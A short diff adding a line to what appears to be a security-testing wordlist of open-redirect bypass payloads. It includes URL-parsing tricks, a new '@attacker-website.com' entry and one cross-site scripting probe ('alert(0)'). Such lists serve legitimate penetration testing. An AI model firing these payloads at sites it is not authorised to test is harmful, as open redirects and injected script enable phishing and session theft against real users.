@@ -1,5 +1,6 @@
 //xgoogle%E3%80%82com
 //blackfan.ru/..;/css
+@attacker-website.com
 /http://site.com@xgoogle.com
 /https:/%5cxgoole.com/u/
 /";alert(0);//
